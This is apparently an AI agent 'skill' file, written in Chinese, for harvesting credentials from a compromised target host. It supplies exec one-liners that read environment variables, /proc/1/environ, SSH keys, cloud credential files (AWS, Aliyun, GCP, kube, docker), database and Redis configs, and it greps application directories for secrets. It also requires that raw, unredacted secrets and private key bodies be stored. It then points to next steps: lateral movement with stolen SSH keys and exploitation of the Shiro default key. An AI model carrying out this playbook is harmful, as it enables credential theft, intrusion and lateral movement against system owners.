---
name: hunt-credentials
description: 在目标主机的环境变量、进程启动参数、配置文件和常见凭据存放路径中猎取账号密码、Token、密钥等敏感信息。覆盖 JDBC 数据库、Redis、Nacos、Shiro Key、SSH、云凭据等所有场景。当任务涉及凭据搜集、密钥提取、数据库密码、Redis 密码、Nacos 配置、Shiro Key、API Token、云凭据或服务账号时使用。
---

# 凭据猎取

当用户希望从目标主机搜集任何类型的敏感凭据时，使用这个 skill。覆盖系统级通用凭据和各专项服务凭据（JDBC、Redis、Nacos、Shiro Key 等）。

## 目标

搜集以下类型的凭据：

- 环境变量中的密码、Token、密钥、密钥文件路径
- 进程启动参数中的内联凭据（`-D`、`--`、`JAVA_OPTS` 等）
- 系统配置文件中的凭据（SSH 私钥、`.env`、`credentials` 文件等）
- 云凭据文件（AWS、阿里云、GCP、Azure）
- 服务账号凭据：JDBC 数据源、Redis、Nacos、Shiro RememberMe Key
- fat jar classpath 内嵌配置（`application.yml`、`bootstrap.yml` 等）

## Skill 元数据

- riskLevel: `medium`
- accessMode: `read_only_sensitive`
- requiredTools: `CredentialHarvestTools(harvestAll)`, `CommandTools(exec)`, `ProcessTools(findProcesses)`
- optionalTools: `ResourceTools`, `BrowserDataTools`, `WifiProfileTools`
- produces: `credentials.generic`, `credentials.jdbc`, `credentials.redis`, `credentials.nacos`, `credentials.shiro`, `credentials.cloud`, `credentials.sshKeys`, `keyPaths.credentialFiles`, `openQuestions`
- structuredPatchPaths: `credentials.generic[]`, `credentials.jdbc[]`, `credentials.redis[]`, `credentials.nacos[]`, `credentials.shiro[]`, `credentials.cloud[]`, `credentials.sshKeys[]`, `keyPaths.credentialFiles[]`
- recommendedNextSkills: `exploit-database-post`, `exploit-redis-post`, `exploit-nacos-post`, `collect-cloud-metadata`, `lateral-move-ssh`
- forbiddenByDefault: 修改凭据文件、使用凭据登录第三方服务、批量读取无关用户目录

## 核心原则：exec 优先，最少调用次数

**禁止**为简单的文件存在性检查、环境变量读取、关键词搜索派发子 Agent。
**所有**只读检查必须用 `exec` 直接执行，多个检查用 `&&` 或 `;` 合并为一条命令。

反例（禁止）：
- 派 file_agent 检查 ~/.ssh 是否存在
- 5 次 exec 分别 grep 不同关键词
- 派 command_agent 执行 env

正例（要求）：
- `exec("env | grep -iE 'password|secret|token|key|auth|credential' && cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'password|secret|token|key'")`
- `exec("ls -la ~/.ssh/ 2>/dev/null && cat ~/.aws/credentials 2>/dev/null && cat ~/.aliyun/config.json 2>/dev/null && cat ~/.kube/config 2>/dev/null && cat ~/.docker/config.json 2>/dev/null")`
- `exec("grep -rnI 'password=\\|secret=\\|token=\\|api_key=\\|access_key=\\|jdbc:\\|BEGIN.*PRIVATE KEY' /opt/ /srv/ /data/ 2>/dev/null | head -200")`

## 工作流程

### 执行前：制定计划

调用 `createPlan`，步骤不超过 5 步：

1. harvestAll 一键采集 JVM 凭据
2. exec 并行扫描环境变量 + 进程参数 + 常见凭据文件路径
3. exec 对应用目录做关键词递归搜索（按需）
4. 汇总分析 + 写入侦察摘要
5. completePlan

### 第一步：JVM 运行时凭据直提（最高效）

直接调用 `harvestAll`，一次获取所有 JVM 可见凭据：
- DataSource Bean（JDBC URL/用户名/密码）
- System Properties 中的敏感条目
- 环境变量中的敏感条目
- JNDI DataSource
- Spring Environment PropertySource

如果目标不是 Java 应用，跳过此步。

### 第二步：系统级凭据扫描（一次 exec 完成）

**合并为一条命令**，不要拆分：

Linux/macOS:
```bash
exec("echo '=== ENV ===' && env | grep -iE 'password|passwd|secret|token|key|auth|credential|private' 2>/dev/null; echo '=== PROC ARGS ===' && ps aux | grep -iE 'password|secret|token|key' | grep -v grep 2>/dev/null; echo '=== SSH KEYS ===' && ls -la ~/.ssh/ 2>/dev/null && ls -la /root/.ssh/ 2>/dev/null; echo '=== CLOUD CREDS ===' && cat ~/.aws/credentials 2>/dev/null && cat ~/.aliyun/config.json 2>/dev/null && cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null; echo '=== DOT ENV ===' && find / -maxdepth 4 -name '.env' -o -name '.env.local' -o -name '.env.production' 2>/dev/null | head -20; echo '=== SERVICE CREDS ===' && cat /etc/redis.conf 2>/dev/null | grep -i 'requirepass' && cat ~/.pgpass 2>/dev/null && cat ~/.my.cnf 2>/dev/null")
```

Windows:
```bash
exec("echo === ENV === && set | findstr /i \"password secret token key auth credential\" & echo === SSH === && dir %USERPROFILE%\\.ssh\\ 2>nul & echo === CLOUD === && type %USERPROFILE%\\.aws\\credentials 2>nul")
```

### 第三步：关键词递归搜索（按需）

仅当前两步未找到足够凭据时执行。**一条命令**完成：

```bash
exec("grep -rnI --include='*.properties' --include='*.yml' --include='*.yaml' --include='*.conf' --include='*.ini' --include='*.cfg' --include='*.xml' --include='*.json' -E 'password=|passwd=|secret=|token=|api_key=|access_key=|private_key=|BEGIN.*PRIVATE KEY|jdbc:' /opt/ /srv/ /data/ /app/ /home/ 2>/dev/null | grep -v 'Binary' | head -200")
```

如果已知应用部署目录（从 harvestAll 或进程参数获取），优先搜索该目录。

### 第四步：汇总 + 写入摘要

分析所有结果，调用 `appendReconSummary` 和 `appendReconSummary`，然后 `completePlan`。

## 工具优先级

1. `harvestAll` — JVM 运行时凭据直提（一次调用，最高效）
2. `exec` — 环境变量、进程参数、文件检查、关键词搜索（合并命令，最少调用次数）
3. `findProcesses` — 查找特定进程的启动参数（name="java" 等）

**禁止使用子 Agent 完成本 skill 的任何步骤。** 所有操作均可通过 harvestAll + exec 直接完成。

## 输出格式

按凭据类型分组输出 Markdown 报告：

```markdown
## 凭据猎取摘要

**总计发现**：{n} 条凭据线索（high: x，medium: y，low: z）

---

## 环境变量凭据

| 变量名 | 原始值 | 来源 | 置信度 |
|--------|----------|------|--------|
| DB_PASSWORD | p@ssw0rd1234 | printenv | high |

## 进程参数凭据

| PID | 参数 | 原始值 | 置信度 |
|-----|------|----------|--------|

## 配置文件凭据

| 文件路径 | 键名 | 原始值 | 置信度 |
|---------|------|----------|--------|

## SSH / 密钥文件

| 路径 | 类型 | 状态 |
|------|------|------|

## 云凭据

| 文件 | 云厂商 | Access Key 原始值 | 置信度 |
|------|--------|------------------|--------|

## 未找到内容

{列出已检查但未发现凭据的位置}

## 下一步建议

根据发现的凭据类型给出 2~3 条具体建议，例如：
- 发现 JDBC/数据库凭据 → "建议使用 exploit-database-post skill 枚举数据库"
- 发现 AWS 凭据 → "建议使用 collect-cloud-metadata skill 枚举云资源权限"
- 发现 SSH 私钥 → "建议尝试使用该私钥横向移动到内网其他主机（lateral-move-ssh）"
- 发现 Redis 密码 → "建议使用 exploit-redis-post skill 连接 Redis"
- 发现 Nacos 凭据 → "建议使用 exploit-nacos-post skill 读取配置中心内容"
- 发现 Shiro 默认密钥 → "可直接利用已知密钥构造反序列化 payload"
```

## 侦察摘要保真规则

- 侦察摘要和结构化摘要必须保留实际发现的原始值，不要主动脱敏、替换为 `****` 或只保存片段。
- 如果源系统本身返回 `****`、`<redacted>` 等脱敏值，按原样保存，并标注 `sourceMasked=true` 或"来源已脱敏"。
- 对 SSH 私钥：如果已经读取到密钥体且与任务相关，可以在结构化摘要中保存完整 `privateKeyBody`；如果只确认了文件存在但未读取正文，则保存路径、类型和可读性。

## 结构化摘要写入

完成后必须：

1. 调用 `appendReconSummary` 保存凭据线索分类、来源和风险等级。
2. 调用 `appendReconSummary` 合并机器可读字段。结构化摘要默认保存原始凭据值；只有来源本身脱敏时才记录脱敏值并标注来源已脱敏。

结构化 patch 示例：

```json
{
  "credentials": {
    "generic": [
      {
        "name": "DB_PASSWORD",
        "type": "environment_variable",
        "secret": "p@ssw0rd1234",
        "source": "printenv",
        "confidence": "high"
      }
    ],
    "sshKeys": [
      {
        "path": "/home/app/.ssh/id_rsa",
        "keyType": "OPENSSH PRIVATE KEY",
        "readable": true,
        "privateKeyBody": "-----BEGIN OPENSSH PRIVATE KEY-----\n...\n-----END OPENSSH PRIVATE KEY-----",
        "confidence": "high"
      }
    ],
    "cloud": [
      {
        "platform": "aws",
        "accessKeyId": "AKIAEXAMPLE123456",
        "source": "~/.aws/credentials",
        "confidence": "high"
      }
    ]
  },
  "keyPaths": {
    "credentialFiles": ["~/.aws/credentials", "/home/app/.ssh/id_rsa"]
  },
  "openQuestions": ["exploit-database-post", "collect-cloud-metadata"]
}
```

## 决策规则

- 不要执行任何写操作，本 skill 仅读取和观察。
- 如果权限不足无法读取某个位置，标注为"权限不足"并继续。
- 如果只找到了变量名但值为空或占位符，标注为低置信度。
- 不要假设或猜测凭据值，只报告实际发现。
- 发现 SSH 私钥时，至少说明文件路径和密钥类型；如果已经读取正文并需要沉淀到侦察摘要，保存原始正文，不要脱敏。
- 发现 JDBC / Redis / Nacos 凭据后，参考下方「专项凭据快查」章节补全对应字段并写入结构化摘要。

---

## 专项凭据快查

> 在通用扫描（步骤一~三）发现线索后，用以下快查补全专项字段。**直接用 exec + ResourceTools 完成，禁止派子 Agent。**

### JDBC 数据源

重点搜索关键字：`spring.datasource.*`、`jdbc:`、`username`、`password`、`driverClassName`、`hikari`、`druid`

优先路径：`application.yml`、`application-prod.yml`、`bootstrap.yml`、`.env`、`context.xml`

fat jar 补充：用 `ResourceTools` 读 `application.yml`、`application-prod.yml`、`bootstrap.yml`、`META-INF/context.xml`

`harvestAll` 已覆盖 JVM 运行时 DataSource Bean，JDBC 场景优先依赖其结果。

结构化写入：`credentials.jdbc[]`，字段：`url`、`username`、`password`、`driverClass`、`source`、`confidence`

---

### Redis 凭据

重点搜索关键字：`spring.redis.*`、`spring.data.redis.*`、`requirepass`、`REDIS_HOST`、`REDIS_PASSWORD`、`redisson`

优先路径：`application.yml`、`application-prod.yml`、`bootstrap.yml`、`redisson.yml`、`/etc/redis/redis.conf`

fat jar 补充：`ResourceTools` 读 `application.yml`、`application-prod.yml`、`redisson.yml`

exec 补充：`ps -ef | grep redis-server | grep -v grep`，从进程参数提取配置文件路径再读取

结构化写入：`credentials.redis[]`，字段：`host`、`port`、`password`、`database`、`mode`（standalone/cluster/sentinel）、`source`、`confidence`

---

### Nacos 配置

重点搜索关键字：`spring.cloud.nacos.*`、`nacos.config.*`、`server-addr`、`namespace`、`NACOS_PASSWORD`

优先路径：`bootstrap.yml`（Nacos 配置通常在此，不在 application.yml）、`application-prod.yml`、`.env`

fat jar 补充：`ResourceTools` 读 `bootstrap.yml`、`bootstrap-prod.yml`

注意：Nacos 密码可能是 `${NACOS_PASSWORD}` 占位符，需追溯环境变量

结构化写入：`credentials.nacos[]`，字段：`serverAddr`、`namespace`、`username`、`password`、`source`、`confidence`

---

### Shiro RememberMe Key

重点搜索关键字：`cipherKey`、`rememberMeManager`、`shiro.key`、`cookieRememberMeManager`

优先路径：`application.yml`、`shiro.ini`、`applicationContext-shiro.xml`、`spring-shiro.xml`

fat jar 补充：`ResourceTools` 读 `shiro.ini`、`applicationContext-shiro.xml`、`spring-mvc.xml`

exec 补充：`grep -rnI 'cipherKey\|rememberMeManager\|shiro\.key' /opt/ /srv/ /app/ 2>/dev/null | head -50`

注意：Shiro 默认密钥为 `kPH+bIxk5D2deZiIxcaaaA==`，若无自定义配置则标注"使用默认密钥，可直接利用"

结构化写入：`credentials.shiro[]`，字段：`cipherKey`、`source`、`isDefault`、`confidence`
